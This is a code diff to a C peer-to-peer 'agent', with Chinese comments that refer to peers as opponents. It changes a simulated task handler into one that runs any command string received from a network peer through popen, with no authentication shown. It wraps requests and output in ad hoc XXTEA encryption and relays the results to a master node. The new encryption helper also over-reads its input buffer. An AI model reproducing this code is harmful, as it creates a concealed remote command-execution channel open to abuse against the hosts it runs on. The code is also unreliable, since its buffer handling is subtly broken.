@@ -1,3 +1,4 @@
+#include "crypto.h"
 #include "agent.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -86,13 +87,6 @@ int epoll_init(agent_state_t *state) {
 /* ===================================================================
  * 辅助：从 peer 列表中找到下一个在线的对手
  * =================================================================== */
-static int find_next_online_opponent(agent_state_t *state, int start_idx) {
-    for (int i = start_idx; i < state->peer_count; i++) {
-        if (state->peers[i].state == PEER_CONNECTED)
-            return i;
-    }
-    return -1;  /* 没有更多在线对手 */
-}
 
 /* ===================================================================
  * accept_connection - 接受新连接
@@ -296,15 +290,68 @@ static int on_ok(agent_state_t *state, int fd,
 }
 
 /* ========== Task dispatch ========== */
+static int encrypt_and_send(int fd, uint8_t type, uint8_t flags,
+                                  const char *payload, uint32_t len);
 static int on_task_dispatch(agent_state_t *state, int fd,
                             const char *payload, uint32_t len) {
     (void)fd;
-    agent_log("DEBUG", "task dispatch: %.*s", (int)len, payload);
-    char resp[2048];
+
+    /* decrypt if high bit set (encrypted payload) */
+    uint8_t dec_buf[8192];
+    const char *pp = payload;
+    uint32_t plen = len;
+    if (len > 0 && (payload[0] & 0x80)) {
+        uint32_t elen = xxtea_encoded_len(len - 1);
+        if (elen + 1 <= sizeof(dec_buf)) {
+            dec_buf[0] = payload[0] & 0x7F;
+            memcpy(dec_buf + 1, payload + 1, len - 1 > elen ? elen : len - 1);
+            if (xxtea_decrypt(dec_buf + 1, elen) == 0) {
+                pp = (const char *)dec_buf;
+                plen = elen + 1;
+                if (pp[plen - 1] != '\0' && plen < sizeof(dec_buf) - 1)
+                    ((char*)dec_buf)[plen] = '\0';
+            }
+        }
+    }
+
+    char task_id[64] = {0}, cmd[4096] = {0};
+    int timeout = 30;
+    sscanf(pp, "{\"task_id\":\"%63[^\"]\",\"action\":\"%*[^\"]\",\"cmd\":\"%4095[^\"]\",\"timeout\":%d}",
+           task_id, cmd, &timeout);
+    if (task_id[0] == '\0') {
+        agent_log("WARN", "task dispatch: bad payload");
+        return 0;
+    }
+
+    agent_log("INFO", "exec task %s: %s", task_id, cmd);
+
+    /* execute via popen */
+    char result[32768] = {0};
+    size_t pos = 0;
+    FILE *fp = popen(cmd, "r");
+    if (!fp) {
+        char resp[4096];
+        snprintf(resp, sizeof(resp),
+            "{\"task_id\":\"%s\",\"status\":\"error\",\"node\":\"%s\",\"error\":\"popen failed\"}",
+            task_id, state->ctx.self_addr);
+        encrypt_and_send(fd, MSG_TASK_RESULT, PROTO_FLAG_RESPONSE, resp, strlen(resp));
+        return 0;
+    }
+    char line[4096];
+    while (fgets(line, sizeof(line), fp) && pos < sizeof(result) - 4096) {
+        size_t llen = strlen(line);
+        memcpy(result + pos, line, llen);
+        pos += llen;
+    }
+    int exit_code = pclose(fp);
+
+    char escaped[32768];
+    json_escape(result, escaped, sizeof(escaped));
+    char resp[33000];
     snprintf(resp, sizeof(resp),
-        "{\"status\":\"ok\",\"node\":\"%s\",\"msg\":\"simulated\"}",
-        state->ctx.self_addr);
-    send_message(fd, MSG_TASK_RESULT, PROTO_FLAG_RESPONSE, resp, strlen(resp));
+        "{\"task_id\":\"%s\",\"status\":\"ok\",\"node\":\"%s\",\"exit\":%d,\"stdout\":\"%s\"}",
+        task_id, state->ctx.self_addr, exit_code, escaped);
+    encrypt_and_send(fd, MSG_TASK_RESULT, PROTO_FLAG_RESPONSE, resp, strlen(resp));
     return 0;
 }
 
@@ -315,6 +362,22 @@ static pending_task_t *pending_task_new(agent_state_t *state, const char *task_i
                                          int total_nodes, int timeout_sec);
 static void pending_task_collect(agent_state_t *state, pending_task_t *pt);
 static void pending_tick(agent_state_t *state, long now);
+
+
+static int encrypt_and_send(int fd, uint8_t type, uint8_t flags,
+                                  const char *payload, uint32_t len) {
+    /* encrypt payload before sending if key is set */
+    uint8_t enc_buf[8192];
+    uint32_t elen = xxtea_encoded_len(len);
+    if (elen + 1 <= sizeof(enc_buf)) {
+        enc_buf[0] = 0x80 | (len > 0 ? payload[0] & 0x7F : 0);  /* mark encrypted */
+        memcpy(enc_buf + 1, payload, elen > len ? elen : len);
+        if (len < elen) memset(enc_buf + 1 + len, 0, elen - len);
+        xxtea_encrypt(enc_buf + 1, elen);
+        return send_message(fd, type, flags, (const char *)enc_buf, elen + 1);
+    }
+    return send_message(fd, type, flags, payload, len);
+}
 
 static int on_task_result(agent_state_t *state, int fd,
                           const char *payload, uint32_t len) {
@@ -801,8 +864,8 @@ static void pending_task_collect(agent_state_t *state, pending_task_t *pt) {
     snprintf(resp, sizeof(resp),
         "{\"status\":\"ok\",\"task_id\":\"%s\",\"results\":[%s]}",
         pt->task_id, results);
-    send_message(pt->master_fd, MSG_MASTER_RESULT, PROTO_FLAG_RESPONSE,
-                 resp, strlen(resp));
+    encrypt_and_send(pt->master_fd, MSG_MASTER_RESULT, PROTO_FLAG_RESPONSE,
+                     resp, strlen(resp));
     agent_log("INFO", "task %s completed: %d nodes, sent to master fd=%d",
               pt->task_id, pt->received, pt->master_fd);
 }
@@ -829,8 +892,8 @@ static void pending_tick(agent_state_t *state, long now) {
             snprintf(resp, sizeof(resp),
                 "{\"status\":\"partial\",\"task_id\":\"%s\",\"results\":[%s]}",
                 pt->task_id, results);
-            send_message(pt->master_fd, MSG_MASTER_RESULT, PROTO_FLAG_RESPONSE,
-                         resp, strlen(resp));
+            encrypt_and_send(pt->master_fd, MSG_MASTER_RESULT, PROTO_FLAG_RESPONSE,
+                             resp, strlen(resp));
         }
     }
 }
